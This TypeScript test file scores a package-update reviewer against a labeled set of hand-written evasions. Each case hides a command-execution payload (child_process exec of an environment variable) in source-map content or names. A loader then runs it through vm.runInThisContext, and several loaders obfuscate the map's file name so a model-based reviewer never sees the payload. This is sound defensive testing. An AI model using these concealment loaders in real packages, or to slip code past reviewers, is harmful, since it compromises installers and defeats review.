// Evasion set: hand-written ways to hide a payload inside a source map or a generated file, kept as labeled data.
// Each case is one release (old and new artifacts) run through reviewUpdate with a fake reviewer that records what it is
// shown. A case says whether the payload is expected to reach the reviewer ("shown") or not ("hidden"), and whether a
// hidden result is a known weakness of the base design. No model runs; the score is deterministic and exact.
import { mkdirSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { reviewUpdate } from "../../src/review.ts";
import type { FileMap } from "../../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));

export const SPAWN = "require('child_process').exec(process.env.Q)";
const MARK = "marker_qq";
const HALF = 26;

/** One side of a map: its sources, sourcesContent and names. */
export interface MapSide { sources: string[]; sc?: (string | null)[]; names?: string[] }
export interface EvasionCase {
  id: string;
  /** What the evasion does, in one line. */
  note: string;
  /** Where the payload is expected to land: in front of the reviewer, or hidden from it. */
  expect: "shown" | "hidden";
  /** A hidden result the base design is known to have; only meaningful when expect is "hidden". */
  baseWeakness?: boolean;
  /** Text that proves the payload reached the reviewer: every entry must be in what the reviewer was shown as new text. */
  key: string[];
  /** The new lib/index.js (the loader). */
  code: string;
  old: MapSide;
  next: MapSide;
  /** Extra files in the new release. */
  extra?: Record<string, string>;
  /** Run only on a padded (250k-line) map or only on a small one; default both. */
  size?: "big" | "small";
}

const map = (seed: string, big: boolean, m: MapSide) => JSON.stringify({ version: 3, file: "index.js", sources: m.sources, names: m.names ?? [], sourcesContent: m.sc ?? m.sources.map(() => "ok"), mappings: ("AAAA" + seed + "CAAO,aAAP,OAAO,uBAAP;").repeat(big ? 250_000 : 20) });
const SC = (k: number) => `m['sources'+'Content'][${k}]`;
const FOLDED = (src: string) => `const m = JSON.parse(require('fs').readFileSync(__filename.replace(/js$/, 'js.m' + 'ap'), 'utf8'));\nrequire('vm').runInThisContext(${src});\nexports.v = 2;\n`;
const PLAIN = (src: string) => `const m = JSON.parse(require('fs').readFileSync(__filename + '.map', 'utf8'));\nrequire('vm').runInThisContext(${src});\nexports.v = 2;\n`;
const READDIR = (src: string) => `const fs = require('fs');\nconst f = fs.readdirSync(__dirname).find((f) => f.endsWith('map'));\nconst m = JSON.parse(fs.readFileSync(__dirname + '/' + f, 'utf8'));\nrequire('vm').runInThisContext(${src});\nexports.v = 2;\n`;
const REVNAME = (src: string) => `const fs = require('fs');\nconst f = fs.readdirSync(__dirname).find((f) => f.endsWith('pam'.split('').reverse().join('')));\nconst m = JSON.parse(fs.readFileSync(__dirname + '/' + f, 'utf8'));\nrequire('vm').runInThisContext(${src});\nexports.v = 2;\n`;
const BARE = "const fs = require('fs');\nconst f = fs.readdirSync(__dirname + '/../lib').find((x) => x.endsWith('.map'));\nconst m = JSON.parse(fs.readFileSync(__dirname + '/../lib/' + f, 'utf8'));\nrequire('vm').runInThisContext(m['sources'+'Content'][0]);\n";
const NOOP = "exports.v = 2;\n";
const A = SPAWN.slice(0, HALF), B = SPAWN.slice(HALF);
const ENTRY = '{"name":"lib","version":"b","main":"lib/index.js","bin":{"cli":"bin/cli"}}';
const Q = [SPAWN];

// Run-time map names the review does not read: the loader assembles the file name in a way that leaves no ".map" string or bare "map" string for the review to extract.
// Each loader puts the payload back from reversed names, as the reversed-string case does, so only a shown map can reveal it. Each case changes one thing from a loader the review does show.
const RT_REV = "m.names.reverse().join('')";
const RT_LOADER = (name: string, parse = (text: string) => `JSON.parse(${text})`) => `const fs = require('fs');\nconst m = ${parse(`fs.readFileSync(${name}, 'utf8')`)};\nrequire('vm').runInThisContext(${RT_REV});\nexports.v = 2;\n`;
const RT_SHAPES: [string, string, string][] = [
  ["split-parts", "a name built from '.m' and String('ap')", RT_LOADER("__filename + '.m' + String('ap')")],
  ["slice", "a name cut from a longer string with slice", RT_LOADER("__filename + '.js.map'.slice(3)")],
  ["replace-marker", "a name made by replacing a marker character", RT_LOADER("__filename.replace(/js$/, 'jsXmap'.replace('X', '.'))")],
  ["lower-case", "a name made by lower-casing an upper-case word", RT_LOADER("__filename + '.' + 'MAP'.toLowerCase()")],
  ["ends-with-ap", "a directory scan that matches the suffix 'ap'", "const fs = require('fs');\nconst f = fs.readdirSync(__dirname).find((x) => x.endsWith('ap'));\nconst m = JSON.parse(fs.readFileSync(__dirname + '/' + f, 'utf8'));\nrequire('vm').runInThisContext(" + RT_REV + ");\nexports.v = 2;\n"],
  ["eval-parse", "a map parsed with eval instead of JSON.parse (the file has a bare map string but no JSON.parse)", RT_LOADER("[__filename, 'map'].join('.')", (text) => `eval('(' + ${text} + ')')`)],
  ["newline-words", "a name joined from words split on newlines", "const fs = require('fs');\nconst w = 'index\\njs\\nmap'.split('\\n');\nconst m = JSON.parse(fs.readFileSync(__dirname + '/' + w.join('.'), 'utf8'));\nrequire('vm').runInThisContext(" + RT_REV + ");\nexports.v = 2;\n"],
  ["char-codes", "a name built from character codes", RT_LOADER("__filename + '.' + String.fromCharCode(109, 97, 112)")],
];
const RT_NAMES = ["_process').exec(process.env.Q)", "require('child"];

export const EVASIONS: EvasionCase[] = [
  { id: "swap-clean-and-payload", note: "entries swapped: payload moves to index 0, loader reads 0", expect: "shown", key: Q, code: PLAIN(SC(0)), old: { sources: ["a", "a"], sc: ["ok", SPAWN] }, next: { sources: ["a", "a"], sc: [SPAWN, "ok"] } },
  { id: "swap-with-new-clean-text", note: "payload at index 0, the other entry gets new text", expect: "shown", key: Q, code: PLAIN(SC(0)), old: { sources: ["a", "a"], sc: ["ok", SPAWN] }, next: { sources: ["a", "a"], sc: [SPAWN, "ok2"] } },
  { id: "shift-by-one-entry", note: "an entry is added in front so the payload moves from 1 to 2", expect: "shown", key: Q, code: PLAIN(SC(2)), old: { sources: ["a", "a"], sc: ["ok", SPAWN] }, next: { sources: ["a", "a", "a"], sc: ["ok", "ok", SPAWN] } },
  { id: "rename-source-then-swap", note: "source names change and the contents swap", expect: "shown", key: Q, code: PLAIN(SC(0)), old: { sources: ["a", "a"], sc: ["ok", SPAWN] }, next: { sources: ["b", "a"], sc: [SPAWN, "ok"] } },
  { id: "reorder-distinct-names", note: "two distinct source names trade places with their text", expect: "shown", key: Q, code: FOLDED(SC(0)), old: { sources: ["x.ts", "a.ts"], sc: ["ok", SPAWN] }, next: { sources: ["a.ts", "x.ts"], sc: [SPAWN, "ok"] } },
  { id: "duplicate-names-payload-first", note: "one source becomes two with the same name, payload in the first", expect: "shown", key: Q, code: READDIR(SC(1)), old: { sources: ["a.ts"], sc: ["ok"] }, next: { sources: ["a.ts", "a.ts"], sc: [SPAWN, "ok"] } },
  { id: "duplicate-names-swapped", note: "two same-named entries swap their text", expect: "shown", key: Q, code: READDIR(SC(0)), old: { sources: ["a.ts", "a.ts"], sc: [SPAWN, "ok"] }, next: { sources: ["a.ts", "a.ts"], sc: ["ok", SPAWN] } },
  { id: "duplicate-names-payload-second", note: "duplicate names on both sides, payload in the second", expect: "shown", key: Q, code: READDIR(SC(1)), old: { sources: ["a.ts", "a.ts"], sc: ["ok", "ok"] }, next: { sources: ["a.ts", "a.ts"], sc: ["ok", SPAWN] } },
  { id: "extra-content-past-sources", note: "sourcesContent has an entry beyond sources", expect: "shown", key: Q, code: PLAIN(SC(1)), old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: ["ok", SPAWN] } },
  { id: "extra-content-no-loader", note: "the same extra entry with no loader at all", expect: "shown", key: Q, code: NOOP, old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: ["ok", SPAWN] } },
  { id: "names-split-forward-join", note: "payload split across two names, joined forward", expect: "shown", key: [A, B], code: READDIR("m.names.join('')"), old: { sources: ["a.ts"] }, next: { sources: ["a.ts"], names: [A, B] } },
  { id: "names-split-reversed", note: "payload split across two names, joined in reverse", expect: "shown", key: [A, B], code: READDIR("m.names.reverse().join('')"), old: { sources: ["a.ts"] }, next: { sources: ["a.ts"], names: [B, A] } },
  { id: "map-name-folded-string", note: "the loader names the map as 'js.m'+'ap'", expect: "shown", key: Q, code: PLAIN(SC(0)).replace("__filename + '.map'", "__filename + '.m' + 'ap'"), old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: [SPAWN] } },
  { id: "map-name-from-char-code", note: "the loader builds the dot from fromCharCode", expect: "shown", key: Q, code: PLAIN(SC(0)).replace("__filename + '.map'", "__filename + String.fromCharCode(46) + 'map'"), old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: [SPAWN] } },
  { id: "map-name-by-directory-scan", note: "the loader finds the map by scanning the folder for a name ending in map", expect: "shown", key: Q, code: READDIR(SC(0)), old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: [SPAWN] } },
  { id: "bare-map-suffix-js", note: "a .js file finds the map by a bare .map suffix; the payload is new map text", expect: "shown", key: [MARK], code: NOOP, extra: { "lib/loader.js": BARE.split("/../lib").join("") }, old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: ["var " + MARK + " = 42;"] } },
  { id: "bare-map-suffix-shebang-bin", note: "an extensionless shebang bin finds the map by a bare .map suffix", expect: "shown", key: [MARK], code: NOOP, extra: { "bin/cli": "#!/usr/bin/env node\n" + BARE, "package.json": ENTRY }, old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: ["var " + MARK + " = 42;"] } },
  { id: "bare-map-suffix-bin-entry", note: "an extensionless bin entry without a shebang finds the map by a bare .map suffix", expect: "shown", key: [MARK], code: NOOP, extra: { "bin/cli": BARE, "package.json": ENTRY }, old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: ["var " + MARK + " = 42;"] } },
  { id: "bare-map-suffix-extensionless-main", note: "an extensionless package main finds the map by a bare .map suffix", expect: "shown", key: [MARK], code: NOOP, extra: { "lib/loader": BARE, "package.json": '{"name":"lib","version":"b","main":"lib/loader"}' }, old: { sources: ["a"], sc: ["ok"] }, next: { sources: ["a"], sc: ["var " + MARK + " = 42;"] } },
  { id: "same-index-same-text-reused", note: "an entry unchanged at its index; its text already shipped in the last release, so a padded map lists no new text", expect: "hidden", baseWeakness: true, key: Q, size: "big", code: FOLDED(SC(1)), old: { sources: ["a", "b"], sc: ["ok", SPAWN] }, next: { sources: ["a", "b"], sc: ["ok2", SPAWN] } },
  { id: "names-split-inside-word-reversed", note: "payload split inside child_process across names, put back in reverse by a loader that finds its map with a bare map string: the review shows the whole map", expect: "shown", key: ["_process').exec(process.env.Q)"], code: READDIR("m.names.reverse().join('')"), old: { sources: ["a.ts"] }, next: { sources: ["a.ts"], names: ["_process').exec(process.env.Q)", "require('child"] } },
  { id: "name-reversed-string", note: "payload split inside child_process across names, put back in reverse by a loader that builds the map suffix by reversing a string: no string of code names the map", expect: "hidden", baseWeakness: true, key: ["_process').exec(process.env.Q)"], code: REVNAME("m.names.reverse().join('')"), old: { sources: ["a.ts"] }, next: { sources: ["a.ts"], names: ["_process').exec(process.env.Q)", "require('child"] } },
  ...RT_SHAPES.map(([id, what, code]): EvasionCase => ({ id: "run-time-name-" + id, note: "payload split inside child_process across names, put back in reverse by a loader whose map name is " + what + ": no string of code names the map", expect: "hidden", baseWeakness: true, key: ["_process').exec(process.env.Q)"], code, old: { sources: ["a.ts"] }, next: { sources: ["a.ts"], names: RT_NAMES } })),
];

export interface EvasionRow { id: string; size: "big" | "small"; expect: "shown" | "hidden"; baseWeakness: boolean; shown: boolean; ran: boolean; ok: boolean }

/** Test hooks: `review` replaces the fake reviewer; `view` rewrites each prompt before it is recorded. */
export interface Hooks { review?: (prompt: string) => Promise<string>; view?: (prompt: string) => string }

/** The release text a prompt shows as new: only its quoted data blocks, without removed lines or [-removed-] spans. */
export function newText(prompt: string): string {
  const blocks = [...prompt.matchAll(/<<<BEGIN UNTRUSTED DATA:[^\n]*\n([\s\S]*?)<<<END UNTRUSTED DATA:/g)].map((m) => m[1]!);
  return blocks.join("\n").split("\n").filter((l) => !l.startsWith("| -")).join("\n").replace(/\[-[\s\S]*?-\]/g, "");
}

async function probe(c: EvasionCase, big: boolean, hooks: Hooks): Promise<{ shown: boolean; ran: boolean }> {
  const reviewed: string[] = [];
  const pj = (v: string) => `{"name":"lib","version":"${v}","main":"lib/index.js"}`;
  const result = await reviewUpdate({
    eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
    registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
    advisories: { query: async () => [] },
    reviewer: { name: "fake", review: async (p) => (reviewed.push((hooks.view ?? ((x: string) => x))(p)), hooks.review ? hooks.review(p) : "APPROVE\nno attack indicators found") },
    cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"), chunkChars: 60000,
    loadArtifacts: async () => ({
      old: files({ "package.json": pj("a"), "lib/index.js": "exports.v = 1;\n", "lib/index.js.map": map("a", big, c.old) }),
      new: files({ "package.json": pj("b"), "lib/index.js": c.code, "lib/index.js.map": map("b", big, c.next), ...c.extra }),
    }),
  });
  // A case only counts when the reviewer was called and no layer errored; otherwise "hidden" would pass untested.
  const ran = reviewed.length > 0 && !result.layers.some((l) => l.verdict === "error");
  const text = reviewed.map(newText).join("\n\0\n");
  return { shown: c.key.every((k) => text.includes(k)), ran };
}

/** Runs every case at each size it applies to. Deterministic: no model, no network. */
export async function scoreEvasions(cases: EvasionCase[] = EVASIONS, hooks: Hooks = {}): Promise<EvasionRow[]> {
  const rows: EvasionRow[] = [];
  for (const c of cases) for (const size of c.size ? [c.size] : (["big", "small"] as const)) {
    const { shown, ran } = await probe(c, size === "big", hooks);
    rows.push({ id: c.id, size, expect: c.expect, baseWeakness: !!c.baseWeakness, shown, ran, ok: ran && shown === (c.expect === "shown") });
  }
  return rows;
}

export interface EvasionSummary { n: number; shown: number; known_base_weaknesses: number; mismatches: string[] }
export function summarize(rows: EvasionRow[]): EvasionSummary {
  return { n: rows.length, shown: rows.filter((r) => r.shown).length, known_base_weaknesses: rows.filter((r) => !r.shown && r.baseWeakness).length, mismatches: rows.filter((r) => !r.ok).map((r) => `${r.id}/${r.size}`) };
}

/** The one-line summary printed by the CLI and run.ts; `failed` is true when any label does not match. */
export function evasionReport(s: EvasionSummary): { line: string; failed: boolean } {
  return { line: `${s.shown} of ${s.n} shown, ${s.known_base_weaknesses} known base weaknesses` + (s.mismatches.length ? `; label mismatches: ${s.mismatches.join(", ")}` : ""), failed: s.mismatches.length > 0 };
}

/** Scores the set and writes results/<version>-evasions.{json,md} into `out`; returns the summary. */
export async function writeEvasions(version: string, out: string, cases: EvasionCase[] = EVASIONS, hooks: Hooks = {}): Promise<EvasionSummary & { tool_version: string }> {
  const rows = await scoreEvasions(cases, hooks);
  const summary = { tool_version: version, ...summarize(rows) };
  mkdirSync(out, { recursive: true });
  writeFileSync(join(out, `${version}-evasions.json`), JSON.stringify({ summary, rows }, null, 2) + "\n");
  const md = [
    `oupdate ${version}, evasion set: ${summary.shown} of ${summary.n} shown, ${summary.known_base_weaknesses} known base weaknesses, ${summary.mismatches.length} label mismatches`, "",
    "| case | size | expected | shown | known weakness | label |", "|---|---|---|---|---|---|",
    ...rows.map((r) => `| ${r.id} | ${r.size} | ${r.expect} | ${r.shown ? "yes" : "no"} | ${r.baseWeakness ? "yes" : "no"} | ${r.ok ? "ok" : "MISMATCH"} |`), "",
  ].join("\n");
  writeFileSync(join(out, `${version}-evasions.md`), md);
  return summary;
}

if (import.meta.main) {
  const here = dirname(new URL(import.meta.url).pathname);
  const version = (await Bun.file(join(here, "../../package.json")).json()).version as string;
  const i = process.argv.indexOf("--out");
  if (i > 0 && !process.argv[i + 1]) { console.error("--out needs a folder"); process.exit(2); }
  const r = evasionReport(await writeEvasions(version, i > 0 ? process.argv[i + 1]! : join(here, "results")));
  console.log(`evasions: ${r.line}`);
  if (r.failed) process.exit(1);
}
